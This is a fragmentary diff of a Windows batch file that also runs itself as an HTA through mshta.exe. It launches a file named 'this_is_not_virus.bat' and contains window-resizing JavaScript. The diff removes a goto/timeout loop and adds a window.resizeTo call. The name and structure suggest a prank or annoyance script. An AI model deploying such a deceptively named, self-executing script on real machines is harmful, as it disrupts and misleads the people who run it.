@@ -1,10 +1,5 @@
 @echo off
-goto i
-e:
-TimeOut 3 >nul
-i:
 start C:\this_is_not_virus.bat
-call goto e
 mshta.exe "%~F0"
 
 goto :EOF
@@ -149,7 +144,7 @@ goto :EOF
 
             function js() {
 
-
+    window.resizeTo(500, 500);
                 // window.moveTo(x, 880);
 
                 // js()
